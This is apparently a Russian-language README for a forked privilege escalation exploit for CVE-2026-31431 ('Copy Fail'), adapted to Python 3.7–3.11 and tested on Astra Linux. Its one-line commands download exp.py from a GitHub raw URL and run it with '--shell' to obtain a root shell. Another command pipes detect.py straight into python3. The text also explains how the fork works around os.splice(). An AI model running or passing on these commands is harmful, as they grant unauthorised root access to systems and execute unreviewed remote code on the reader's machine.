# CVE-2026-31431 "Copy Fail" - Local Privilege Escalation

## Python 3.7+ совместимая версия (включая Astra Linux)

```bash
python3 -c "$(curl -s https://raw.githubusercontent.com/p401a-ops/Copy-Fail/refs/heads/main/exp.py)" --shell
```

```bash
curl -s https://raw.githubusercontent.com/p401a-ops/Copy-Fail/refs/heads/main/detect.py | python3
```

---

## Данная версия эксплойта

**Это форк, адаптированный для Python 3.7, 3.8, 3.9, 3.10, 3.11.**
Оригинальные эксплойты требуют Python 3.12+ из-за использования `os.splice()`.

### Почему не работает оригинал?

```python
# ❌ Оригинальный эксплойт (только Python 3.12+)
os.splice(fd_in, fd_out, length, offset_src=offset)
# AttributeError: module 'os' has no attribute 'splice'
```

### Что изменено в этом форке?

* Убрана зависимость от `os.splice()`
* Добавлена совместимость с Python 3.7+
* Эксплойт протестирован на Astra Linux
* Сохранена совместимость с современными дистрибутивами
* Добавлен простой one-liner запуск

### Примечания

* Требуется локальный доступ к системе
* Python должен быть установлен в системе
* Проверено на Astra Linux CE/SE
* Работает без Python 3.12+
